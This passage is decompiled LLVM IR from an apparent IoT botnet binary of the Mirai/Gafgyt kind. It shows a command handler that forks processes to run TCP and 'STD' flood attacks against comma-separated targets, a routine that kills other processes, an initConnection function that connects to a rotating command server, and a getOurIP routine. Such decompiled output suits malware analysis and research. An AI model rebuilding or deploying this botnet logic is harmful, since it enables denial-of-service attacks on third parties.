  %v1_dc04 = inttoptr i32 %v1_dc00 to i32*
  %v2_dc04 = load i32, i32* %v1_dc04, align 4
  %v2_dc14 = load i32, i32* %v1_db48, align 4
  store i32 %v2_dc14, i32* @r0, align 4
  %v1_dc1c = call i32 @atol(i32 %v2_dc14)
  %v2_dc30 = load i32, i32* %v1_db28, align 4
  store i32 %v2_dc30, i32* @r0, align 4
  %v1_dc38 = call i32 @atol(i32 %v2_dc30)
  %v2_dc4c = load i32, i32* %v1_db68, align 4
  store i32 %v2_dc4c, i32* @r0, align 4
  %v1_dc54 = call i32 @atol(i32 %v2_dc4c)
  %v1_dc64 = add i32 %tmp, 20
  %v1_dc68 = inttoptr i32 %v1_dc64 to i32*
  %v2_dc68 = load i32, i32* %v1_dc68, align 4
  br i1 %v7_dbd0, label %dec_label_pc_dc7c, label %dec_label_pc_dc98

dec_label_pc_dc7c:                                ; preds = %dec_label_pc_dbfc
  %v1_dc80 = add i32 %tmp, 28
  %v1_dc84 = inttoptr i32 %v1_dc80 to i32*
  %v2_dc84 = load i32, i32* %v1_dc84, align 4
  store i32 %v2_dc84, i32* @r0, align 4
  %v1_dc8c = call i32 @atol(i32 %v2_dc84)
  br label %dec_label_pc_dca0

dec_label_pc_dc98:                                ; preds = %dec_label_pc_dbfc
  br label %dec_label_pc_dca0

dec_label_pc_dca0:                                ; preds = %dec_label_pc_dc7c, %dec_label_pc_dc98
  %storemerge5 = phi i32 [ 10, %dec_label_pc_dc98 ], [ %v1_dc8c, %dec_label_pc_dc7c ]
  br i1 %v7_dba8, label %dec_label_pc_dcd0, label %dec_label_pc_dcb4

dec_label_pc_dcb4:                                ; preds = %dec_label_pc_dca0
  %v1_dcb8 = add i32 %tmp, 24
  %v1_dcbc = inttoptr i32 %v1_dcb8 to i32*
  %v2_dcbc = load i32, i32* %v1_dcbc, align 4
  store i32 %v2_dcbc, i32* @r0, align 4
  %v1_dcc4 = call i32 @atol(i32 %v2_dcbc)
  br label %dec_label_pc_dcd8

dec_label_pc_dcd0:                                ; preds = %dec_label_pc_dca0
  br label %dec_label_pc_dcd8

dec_label_pc_dcd8:                                ; preds = %dec_label_pc_dcb4, %dec_label_pc_dcd0
  %storemerge4 = phi i32 [ 0, %dec_label_pc_dcd0 ], [ %v1_dcc4, %dec_label_pc_dcb4 ]
  %v2_dcec = call i32 @__GI_strchr(i32 %v2_dc04, i32 44)
  %v2_dcf4 = icmp eq i32 %v2_dcec, 0
  br i1 %v2_dcf4, label %dec_label_pc_dd80, label %dec_label_pc_dcfc

dec_label_pc_dcfc:                                ; preds = %dec_label_pc_dcd8
  store i32 %v2_dc04, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18b4c.206 to i32), i32* @r1, align 4
  %v2_dd08 = call i32 @__GI_strtok(i32 %v2_dc04, i32 ptrtoint (i32* @global_var_18b4c.206 to i32))
  %v2_dd7427 = icmp eq i32 %v2_dd08, 0
  br i1 %v2_dd7427, label %dec_label_pc_ddc4, label %dec_label_pc_dd18

dec_label_pc_dd18:                                ; preds = %dec_label_pc_dcfc, %dec_label_pc_dd5c
  %storemerge1328 = phi i32 [ %v2_dd64, %dec_label_pc_dd5c ], [ %v2_dd08, %dec_label_pc_dcfc ]
  %v0_dd18 = call i32 @listFork()
  %v2_dd20 = icmp eq i32 %v0_dd18, 0
  br i1 %v2_dd20, label %dec_label_pc_dd28, label %dec_label_pc_dd5c

dec_label_pc_dd28:                                ; preds = %dec_label_pc_dd18
  %v7_dd50 = call i32 @sendTCP(i32 %storemerge1328, i32 %v1_dc1c, i32 %v1_dc38, i32 %v1_dc54, i32 %v2_dc68, i32 %storemerge4, i32 %storemerge5)
  %v1_dd58 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_dd5c:                                ; preds = %dec_label_pc_dd18
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18b4c.206 to i32), i32* @r1, align 4
  %v2_dd64 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_18b4c.206 to i32))
  %v2_dd74 = icmp eq i32 %v2_dd64, 0
  br i1 %v2_dd74, label %dec_label_pc_ddc4, label %dec_label_pc_dd18

dec_label_pc_dd80:                                ; preds = %dec_label_pc_dcd8
  %v0_dd80 = call i32 @listFork()
  %v2_dd88 = icmp eq i32 %v0_dd80, 0
  br i1 %v2_dd88, label %dec_label_pc_dd90, label %dec_label_pc_ddc4

dec_label_pc_dd90:                                ; preds = %dec_label_pc_dd80
  %v7_ddb8 = call i32 @sendTCP(i32 %v2_dc04, i32 %v1_dc1c, i32 %v1_dc38, i32 %v1_dc54, i32 %v2_dc68, i32 %storemerge4, i32 %storemerge5)
  %v1_ddc0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_ddc4:                                ; preds = %dec_label_pc_dd5c, %dec_label_pc_dcfc, %dec_label_pc_dd80, %dec_label_pc_daf4
  %v2_ddc8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_18bb4.238 to i32), i32* @r1, align 4
  %v3_ddd4 = inttoptr i32 %v2_ddc8 to i8*
  %v4_ddd4 = call i32 @__GI_strcoll(i8* %v3_ddd4, i32 ptrtoint ([4 x i8]* @global_var_18bb4.238 to i32))
  %v2_dddc = icmp eq i32 %v4_ddd4, 0
  br i1 %v2_dddc, label %dec_label_pc_dde4, label %dec_label_pc_df28

dec_label_pc_dde4:                                ; preds = %dec_label_pc_ddc4
  %v7_ddec = icmp slt i32 %arg1, 4
  br i1 %v7_ddec, label %dec_label_pc_e040, label %dec_label_pc_ddf0

dec_label_pc_ddf0:                                ; preds = %dec_label_pc_dde4
  %v1_ddf4 = add i32 %tmp, 8
  %v1_ddf8 = inttoptr i32 %v1_ddf4 to i32*
  %v2_ddf8 = load i32, i32* %v1_ddf8, align 4
  store i32 %v2_ddf8, i32* @r0, align 4
  %v1_de00 = call i32 @atol(i32 %v2_ddf8)
  %tmp90 = icmp slt i32 %v1_de00, 1
  br i1 %tmp90, label %dec_label_pc_e040, label %dec_label_pc_de10

dec_label_pc_de10:                                ; preds = %dec_label_pc_ddf0
  %v1_de14 = add i32 %tmp, 12
  %v1_de18 = inttoptr i32 %v1_de14 to i32*
  %v2_de18 = load i32, i32* %v1_de18, align 4
  store i32 %v2_de18, i32* @r0, align 4
  %v1_de20 = call i32 @atol(i32 %v2_de18)
  %v5_de2c = icmp sgt i32 %v1_de20, 0
  br i1 %v5_de2c, label %dec_label_pc_de34, label %dec_label_pc_e040

dec_label_pc_de34:                                ; preds = %dec_label_pc_de10
  %v1_de38 = add i32 %tmp, 4
  %v1_de3c = inttoptr i32 %v1_de38 to i32*
  %v2_de3c = load i32, i32* %v1_de3c, align 4
  %v2_de4c = load i32, i32* %v1_ddf8, align 4
  store i32 %v2_de4c, i32* @r0, align 4
  %v1_de54 = call i32 @atol(i32 %v2_de4c)
  %v2_de68 = load i32, i32* %v1_de18, align 4
  store i32 %v2_de68, i32* @r0, align 4
  %v1_de70 = call i32 @atol(i32 %v2_de68)
  %v2_de88 = call i32 @__GI_strchr(i32 %v2_de3c, i32 44)
  %v2_de90 = icmp eq i32 %v2_de88, 0
  br i1 %v2_de90, label %dec_label_pc_df00, label %dec_label_pc_de98

dec_label_pc_de98:                                ; preds = %dec_label_pc_de34
  store i32 %v2_de3c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18b4c.206 to i32), i32* @r1, align 4
  %v2_dea4 = call i32 @__GI_strtok(i32 %v2_de3c, i32 ptrtoint (i32* @global_var_18b4c.206 to i32))
  %v2_def424 = icmp eq i32 %v2_dea4, 0
  br i1 %v2_def424, label %dec_label_pc_df28, label %dec_label_pc_deb4

dec_label_pc_deb4:                                ; preds = %dec_label_pc_de98, %dec_label_pc_dedc
  %storemerge1125 = phi i32 [ %v2_dee4, %dec_label_pc_dedc ], [ %v2_dea4, %dec_label_pc_de98 ]
  %v0_deb4 = call i32 @listFork()
  %v2_debc = icmp eq i32 %v0_deb4, 0
  br i1 %v2_debc, label %dec_label_pc_dec4, label %dec_label_pc_dedc

dec_label_pc_dec4:                                ; preds = %dec_label_pc_deb4
  %v4_ded0 = call i32 @sendSTD(i32 %storemerge1125, i32 %v1_de54, i32 %v1_de70, i32 0)
  %v1_ded8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_dedc:                                ; preds = %dec_label_pc_deb4
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18b4c.206 to i32), i32* @r1, align 4
  %v2_dee4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_18b4c.206 to i32))
  %v2_def4 = icmp eq i32 %v2_dee4, 0
  br i1 %v2_def4, label %dec_label_pc_df28, label %dec_label_pc_deb4

dec_label_pc_df00:                                ; preds = %dec_label_pc_de34
  %v0_df00 = call i32 @listFork()
  %v2_df08 = icmp eq i32 %v0_df00, 0
  br i1 %v2_df08, label %dec_label_pc_df10, label %dec_label_pc_e040

dec_label_pc_df10:                                ; preds = %dec_label_pc_df00
  %v4_df1c = call i32 @sendSTD(i32 %v2_de3c, i32 %v1_de54, i32 %v1_de70, i32 0)
  %v1_df24 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_df28:                                ; preds = %dec_label_pc_dedc, %dec_label_pc_de98, %dec_label_pc_ddc4
  %v2_df2c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18bb8.240 to i32), i32* @r1, align 4
  %v3_df38 = inttoptr i32 %v2_df2c to i8*
  %v4_df38 = call i32 @__GI_strcoll(i8* %v3_df38, i32 ptrtoint ([5 x i8]* @global_var_18bb8.240 to i32))
  %v2_df40 = icmp eq i32 %v4_df38, 0
  br i1 %v2_df40, label %dec_label_pc_df48, label %dec_label_pc_e040

dec_label_pc_df48:                                ; preds = %dec_label_pc_df28
  br label %dec_label_pc_dfec

dec_label_pc_df5c:                                ; preds = %dec_label_pc_dfec, %dec_label_pc_e020
  %v3_df60 = mul i32 %storemerge9, 4
  %v2_df6c = load i32, i32* @global_var_28af0.67, align 4
  %v2_df70 = add i32 %v2_df6c, %v3_df60
  %v1_df74 = inttoptr i32 %v2_df70 to i32*
  %v2_df74 = load i32, i32* %v1_df74, align 4
  %v2_df78 = icmp eq i32 %v2_df74, 0
  br i1 %v2_df78, label %dec_label_pc_dfe0, label %dec_label_pc_df80

dec_label_pc_df80:                                ; preds = %dec_label_pc_df5c
  %v2_df98 = load i32, i32* %v1_df74, align 4
  store i32 %v2_df98, i32* @r4, align 4
  %v0_df9c = call i32 @__libc_getpid()
  %v0_dfa4 = load i32, i32* @r4, align 4
  %v9_dfa4 = icmp eq i32 %v0_dfa4, %v0_df9c
  br i1 %v9_dfa4, label %dec_label_pc_dfe0, label %dec_label_pc_dfac

dec_label_pc_dfac:                                ; preds = %dec_label_pc_df80
  %v0_dfd0 = call i32 @kill()
  %v1_dfd8 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %dec_label_pc_df80, %dec_label_pc_df5c, %dec_label_pc_dfac
  %v24_e04434 = phi i32 [ %v24_e04435, %dec_label_pc_df5c ], [ %v0_df9c, %dec_label_pc_df80 ], [ %v0_dfd0, %dec_label_pc_dfac ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.1, %dec_label_pc_df5c ], [ %stack_var_-44.1, %dec_label_pc_df80 ], [ %v1_dfd8, %dec_label_pc_dfac ]
  %v1_dfe4 = add i32 %storemerge9, 1
  br label %dec_label_pc_dfec

dec_label_pc_dfec:                                ; preds = %dec_label_pc_df48, %dec_label_pc_dfe0
  %v24_e04435 = phi i32 [ 0, %dec_label_pc_df48 ], [ %v24_e04434, %dec_label_pc_dfe0 ]
  %stack_var_-44.1 = phi i32 [ 0, %dec_label_pc_df48 ], [ %stack_var_-44.0, %dec_label_pc_dfe0 ]
  %storemerge9 = phi i32 [ 0, %dec_label_pc_df48 ], [ %v1_dfe4, %dec_label_pc_dfe0 ]
  %v5_e004 = load i32, i32* @global_var_22870.65, align 4
  %v9_e018 = icmp eq i32 %v5_e004, 0
  br i1 %v9_e018, label %dec_label_pc_e020, label %dec_label_pc_df5c

dec_label_pc_e020:                                ; preds = %dec_label_pc_dfec
  %v2_e004 = load i32, i32* @global_var_2286c.64, align 4
  %tmp98 = icmp ugt i32 %v2_e004, %storemerge9
  br i1 %tmp98, label %dec_label_pc_df5c, label %dec_label_pc_e040

dec_label_pc_e040:                                ; preds = %dec_label_pc_e020, %dec_label_pc_da84, %dec_label_pc_da1c, %dec_label_pc_de10, %dec_label_pc_dbd8, %dec_label_pc_d8a8, %dec_label_pc_d640, %dec_label_pc_df00, %dec_label_pc_df28, %dec_label_pc_daa8, %dec_label_pc_d664, %dec_label_pc_d58c, %dec_label_pc_ddf0, %dec_label_pc_dde4, %dec_label_pc_dbac, %dec_label_pc_db80, %dec_label_pc_db60, %dec_label_pc_db40, %dec_label_pc_db20, %dec_label_pc_db14, %dec_label_pc_d87c, %dec_label_pc_d854, %dec_label_pc_d834, %dec_label_pc_d814, %dec_label_pc_d7f4, %dec_label_pc_d7d4, %dec_label_pc_d7b4, %dec_label_pc_d7a8, %dec_label_pc_d620, %dec_label_pc_d614, %dec_label_pc_d538, %entry, %dec_label_pc_d5c4
  %v24_e044 = phi i32 [ %v1_de20, %dec_label_pc_de10 ], [ %v1_dbe8, %dec_label_pc_dbd8 ], [ %v1_d8b8, %dec_label_pc_d8a8 ], [ %v1_d650, %dec_label_pc_d640 ], [ %v0_df00, %dec_label_pc_df00 ], [ %v4_df38, %dec_label_pc_df28 ], [ %v0_daa8, %dec_label_pc_daa8 ], [ %v0_d664, %dec_label_pc_d664 ], [ 0, %dec_label_pc_d58c ], [ %v1_de00, %dec_label_pc_ddf0 ], [ 0, %dec_label_pc_dde4 ], [ %v1_dbbc, %dec_label_pc_dbac ], [ %v1_db90, %dec_label_pc_db80 ], [ %v1_db70, %dec_label_pc_db60 ], [ %v1_db50, %dec_label_pc_db40 ], [ %v1_db30, %dec_label_pc_db20 ], [ 0, %dec_label_pc_db14 ], [ %v1_d88c, %dec_label_pc_d87c ], [ %v1_d864, %dec_label_pc_d854 ], [ %v1_d844, %dec_label_pc_d834 ], [ %v1_d824, %dec_label_pc_d814 ], [ %v1_d804, %dec_label_pc_d7f4 ], [ %v1_d7e4, %dec_label_pc_d7d4 ], [ %v1_d7c4, %dec_label_pc_d7b4 ], [ 0, %dec_label_pc_d7a8 ], [ %v1_d630, %dec_label_pc_d620 ], [ 0, %dec_label_pc_d614 ], [ 0, %dec_label_pc_d538 ], [ 0, %entry ], [ %v0_d59c, %dec_label_pc_d5c4 ], [ 0, %dec_label_pc_da1c ], [ 0, %dec_label_pc_da84 ], [ %v24_e04435, %dec_label_pc_e020 ]
  store i32 %v3_d4c0, i32* @r4, align 4
  store i32 %v6_d4c0, i32* @r5, align 4
  store i32 %v9_d4c0, i32* @r6, align 4
  store i32 %v12_d4c0, i32* @r7, align 4
  store i32 %v15_d4c0, i32* @r8, align 4
  store i32 %v18_d4c0, i32* @fp, align 4
  ret i32 %v24_e044

; uselistorder directives
  uselistorder i32 %stack_var_-44.1, { 0, 2, 1 }
  uselistorder i32 %v2_dee4, { 1, 0 }
  uselistorder i32 %v1_de70, { 1, 0 }
  uselistorder i32 %v1_de54, { 1, 0 }
  uselistorder i32 %v2_de3c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_dd64, { 1, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v1_dc54, { 1, 0 }
  uselistorder i32 %v1_dc38, { 1, 0 }
  uselistorder i32 %v1_dc1c, { 1, 0 }
  uselistorder i32 %v2_dc04, { 2, 1, 0, 3 }
  uselistorder i32 %v1_db70, { 1, 0 }
  uselistorder i32 %v1_db50, { 1, 0 }
  uselistorder i32 %v1_db30, { 1, 0 }
  uselistorder i32 %v2_da8c, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %v1_d924, { 1, 0 }
  uselistorder i32 %v1_d908, { 1, 0 }
  uselistorder i32 %v1_d8ec, { 1, 0 }
  uselistorder i32 %v2_d8d4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_d824, { 1, 0 }
  uselistorder i32 %v1_d804, { 1, 0 }
  uselistorder i32 %v1_d7e4, { 1, 0 }
  uselistorder i32 %v1_d7c4, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 4, 1, 5, 6, 7, 8, 0, 9, 10, 11, 14, 13, 12, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_18b4c.206 to i32), { 1, 8, 2, 9, 0, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 1000, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_28aec.224, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_e040, { 0, 8, 7, 3, 12, 13, 4, 14, 15, 16, 17, 18, 19, 9, 1, 2, 5, 20, 21, 22, 23, 24, 25, 26, 27, 10, 6, 28, 29, 32, 11, 30, 31 }
  uselistorder label %dec_label_pc_dfec, { 1, 0 }
  uselistorder label %dec_label_pc_dfe0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_df5c, { 1, 0 }
  uselistorder label %dec_label_pc_deb4, { 1, 0 }
  uselistorder label %dec_label_pc_ddc4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_dd18, { 1, 0 }
  uselistorder label %dec_label_pc_dcd8, { 1, 0 }
  uselistorder label %dec_label_pc_dca0, { 1, 0 }
  uselistorder label %dec_label_pc_dbfc, { 1, 0 }
  uselistorder label %dec_label_pc_da38, { 1, 0 }
  uselistorder label %dec_label_pc_d9f8, { 1, 0 }
  uselistorder label %dec_label_pc_d9c0, { 1, 0 }
  uselistorder label %dec_label_pc_d97c, { 1, 0 }
  uselistorder label %dec_label_pc_d8cc, { 1, 0 }
  uselistorder label %dec_label_pc_d788, { 1, 0 }
  uselistorder label %dec_label_pc_d568, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_e088 = load i32, i32* @fp, align 4
  store i32 57488, i32* %stack_var_-4, align 4
  %v2_e08c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e08c, i32* @fp, align 4
  %v2_e0a0 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_e0b0 = bitcast i32* %stack_var_-4116 to i8*
  %v3_e0b0 = call i32 @__GI_memset(i8* %v2_e0b0, i32 0)
  %v2_e0b8 = load i32, i32* @global_var_22864.48, align 4
  %v2_e0bc = icmp eq i32 %v2_e0b8, 0
  br i1 %v2_e0bc, label %dec_label_pc_e0e0, label %dec_label_pc_e0c4

dec_label_pc_e0c4:                                ; preds = %entry
  %v1_e0d0 = call i32 @__libc_close(i32 %v2_e0b8)
  store i32 0, i32* @global_var_22864.48, align 4
  br label %dec_label_pc_e0e0

dec_label_pc_e0e0:                                ; preds = %entry, %dec_label_pc_e0c4
  %v2_e0e4 = load i32, i32* @global_var_2243c.245, align 4
  %v2_e0e8 = icmp eq i32 %v2_e0e4, 0
  br i1 %v2_e0e8, label %dec_label_pc_e114, label %dec_label_pc_e100

dec_label_pc_e100:                                ; preds = %dec_label_pc_e0e0
  %v1_e108 = add i32 %v2_e0e4, 1
  br label %dec_label_pc_e114

dec_label_pc_e114:                                ; preds = %dec_label_pc_e0e0, %dec_label_pc_e100
  %storemerge1 = phi i32 [ %v1_e108, %dec_label_pc_e100 ], [ 0, %dec_label_pc_e0e0 ]
  store i32 %storemerge1, i32* @global_var_2243c.245, align 4
  %v4_e12c = mul i32 %storemerge1, 4
  %v5_e12c = add i32 %v4_e12c, ptrtoint ([20 x i8]** @global_var_223ec.247 to i32)
  %v6_e12c = inttoptr i32 %v5_e12c to i32*
  %v7_e12c = load i32, i32* %v6_e12c, align 4
  %v2_e138 = inttoptr i32 %v7_e12c to i8*
  %v3_e138 = call i32 @strcpy(i32 %v2_e0a0, i8* %v2_e138)
  %v2_e158 = call i32 @__GI_strchr(i32 %v2_e0a0, i32 58)
  %v2_e160 = icmp eq i32 %v2_e158, 0
  br i1 %v2_e160, label %dec_label_pc_e1c0, label %dec_label_pc_e168

dec_label_pc_e168:                                ; preds = %dec_label_pc_e114
  %v2_e17c = call i32 @__GI_strchr(i32 %v2_e0a0, i32 58)
  %v1_e184 = add i32 %v2_e17c, 1
  store i32 %v1_e184, i32* @r0, align 4
  %v1_e18c = call i32 @atol(i32 %v1_e184)
  %v2_e1ac = call i32 @__GI_strchr(i32 %v2_e0a0, i32 58)
  %v3_e1bc = inttoptr i32 %v2_e1ac to i8*
  store i8 0, i8* %v3_e1bc, align 1
  br label %dec_label_pc_e1c0

dec_label_pc_e1c0:                                ; preds = %dec_label_pc_e114, %dec_label_pc_e168
  %stack_var_-20.0 = phi i32 [ 123, %dec_label_pc_e114 ], [ %v1_e18c, %dec_label_pc_e168 ]
  %v0_e1cc = call i32 @socket()
  store i32 %v0_e1cc, i32* @global_var_22864.48, align 4
  %v4_e200 = call i32 @connectTimeout(i32 %v0_e1cc, i32 %v2_e0a0, i32 %stack_var_-20.0, i32 30)
  %v2_e208 = icmp eq i32 %v4_e200, 0
  %. = zext i1 %v2_e208 to i32
  store i32 %v3_e088, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_e0a0, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e1c0, { 1, 0 }
  uselistorder label %dec_label_pc_e114, { 1, 0 }
  uselistorder label %dec_label_pc_e0e0, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e250 = load i32, i32* @fp, align 4
  store i32 %v3_e250, i32* %stack_var_-16, align 4
  %v0_e26c = call i32 @socket()
  %v3_e27c = icmp eq i32 %v0_e26c, -1
  br i1 %v3_e27c, label %dec_label_pc_e284, label %dec_label_pc_e294

dec_label_pc_e284:                                ; preds = %entry
  br label %dec_label_pc_e4fc

dec_label_pc_e294:                                ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18bc0.249 to i32), i32* @r0, align 4
  %v2_e2d8 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_18bc0.249 to i32))
  %v1_e2e8 = call i32 @htons(i32 53)
  %v3_e30c = bitcast i32* %stack_var_-52 to %sockaddr*
  %v4_e30c = call i32 @__libc_connect(i32 %v0_e26c, %sockaddr* %v3_e30c, i32 16)
  %v3_e31c = icmp eq i32 %v4_e30c, -1
  br i1 %v3_e31c, label %dec_label_pc_e324, label %dec_label_pc_e334

dec_label_pc_e324:                                ; preds = %dec_label_pc_e294
  br label %dec_label_pc_e4fc

dec_label_pc_e334:                                ; preds = %dec_label_pc_e294
  store i32 16, i32* %stack_var_-72, align 4
  %v2_e33c = ptrtoint i32* %stack_var_-68 to i32
  %v2_e340 = ptrtoint i32* %stack_var_-72 to i32
  %v5_e34c = bitcast i32* %stack_var_-68 to %sockaddr*
  %v6_e34c = call i32 @__GI_getsockname(i32 %v0_e26c, %sockaddr* %v5_e34c, i32 %v2_e340, i32 %v2_e33c, i32 16)
  %v3_e35c = icmp eq i32 %v6_e34c, -1
  br i1 %v3_e35c, label %dec_label_pc_e364, label %dec_label_pc_e374

dec_label_pc_e364:                                ; preds = %dec_label_pc_e334
  br label %dec_label_pc_e4fc

dec_label_pc_e374:                                ; preds = %dec_label_pc_e334
  store i32 ptrtoint (i32* @global_var_28ae4.79 to i32), i32* @r2, align 4
  %v4_e388 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_18bc8.252, i32 0, i32 0), i32 0)
  %v2_e420 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_e418

dec_label_pc_e398:                                ; preds = %dec_label_pc_e418
  %v8_e3ac = call i32 @strstr(i32 %v2_e420, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18bd8.254, i32 0, i32 0), i32 %v4_e388, i32 %v2_e420, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v2_e3b4 = icmp eq i32 %v8_e3ac, 0
  br i1 %v2_e3b4, label %dec_label_pc_e3fc, label %dec_label_pc_e3dc.preheader

dec_label_pc_e3dc.preheader:                      ; preds = %dec_label_pc_e398
  %v2_e3e09 = load i8, i8* %stack_var_-4168, align 1
  %v7_e3e413 = icmp eq i8 %v2_e3e09, 9
  br i1 %v7_e3e413, label %dec_label_pc_e3ec, label %dec_label_pc_e3d0

dec_label_pc_e3d0:                                ; preds = %dec_label_pc_e3dc.preheader, %dec_label_pc_e3d0
  %v4_e3dc14 = phi i32 [ %v1_e3d4, %dec_label_pc_e3d0 ], [ %v2_e420, %dec_label_pc_e3dc.preheader ]
  %v1_e3d4 = add i32 %v4_e3dc14, 1
  %v5_e3d8 = inttoptr i32 %v1_e3d4 to i8*
  %v2_e3e0 = load i8, i8* %v5_e3d8, align 1
  %v7_e3e4 = icmp eq i8 %v2_e3e0, 9
  br i1 %v7_e3e4, label %dec_label_pc_e3ec, label %dec_label_pc_e3d0

dec_label_pc_e3ec:                                ; preds = %dec_label_pc_e3d0, %dec_label_pc_e3dc.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_e3dc.preheader ], [ %v5_e3d8, %dec_label_pc_e3d0 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_e440

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e398
  store i32 4096, i32* @r2, align 4
  %v3_e414 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_e418

dec_label_pc_e418:                                ; preds = %dec_label_pc_e374, %dec_label_pc_e3fc
  %v4_e430 = call i32 @fdgets(i32 %v2_e420, i32 4096, i32 %v4_e388, i32 %v2_e420)
  %v2_e438 = icmp eq i32 %v4_e430, 0
  br i1 %v2_e438, label %dec_label_pc_e440, label %dec_label_pc_e398

dec_label_pc_e440:                                ; preds = %dec_label_pc_e418, %dec_label_pc_e3ec
  %v1_e444 = call i32 @__libc_close(i32 %v4_e388)
  %v4_e454 = load i8, i8* %stack_var_-4168, align 1
  %v2_e458 = icmp eq i8 %v4_e454, 0
  br i1 %v2_e458, label %dec_label_pc_e4f0, label %dec_label_pc_e460

dec_label_pc_e460:                                ; preds = %dec_label_pc_e440
  %v2_e468 = ptrtoint i32* %stack_var_-4200 to i32
  %v3_e480 = call i32 @strcpy(i32 %v2_e468, i8* nonnull %stack_var_-4168)
  %v3_e4a0 = call i32 @ioctl(i32 %v0_e26c, i32 35111, i32 %v2_e468)
  %v2_e4c0 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_e4b0

dec_label_pc_e4b0:                                ; preds = %dec_label_pc_e460, %dec_label_pc_e4b0
  %storemerge47 = phi i32 [ 0, %dec_label_pc_e460 ], [ %v1_e4dc, %dec_label_pc_e4b0 ]
  %v2_e4c8 = add i32 %storemerge47, %v2_e4c0
  %v1_e4cc = inttoptr i32 %v2_e4c8 to i8*
  %v2_e4cc = load i8, i8* %v1_e4cc, align 1
  %v4_e4d4 = add i32 %storemerge47, ptrtoint (i32* @global_var_22874.256 to i32)
  %v5_e4d4 = inttoptr i32 %v4_e4d4 to i8*
  store i8 %v2_e4cc, i8* %v5_e4d4, align 1
  %v1_e4dc = add nuw nsw i32 %storemerge47, 1
  %v7_e4ec = icmp slt i32 %v1_e4dc, 6
  br i1 %v7_e4ec, label %dec_label_pc_e4b0, label %dec_label_pc_e4f0

dec_label_pc_e4f0:                                ; preds = %dec_label_pc_e4b0, %dec_label_pc_e440
  %v1_e4f4 = call i32 @__libc_close(i32 %v0_e26c)
  %v3_e510.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e50c

dec_label_pc_e4fc:                                ; preds = %dec_label_pc_e284, %dec_label_pc_e364, %dec_label_pc_e324
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e50c

dec_label_pc_e50c:                                ; preds = %dec_label_pc_e4f0, %dec_label_pc_e4fc
  %v3_e510 = phi i32 [ %v3_e510.pre, %dec_label_pc_e4f0 ], [ 0, %dec_label_pc_e4fc ]
  %v2_e518 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e518, i32* @fp, align 4
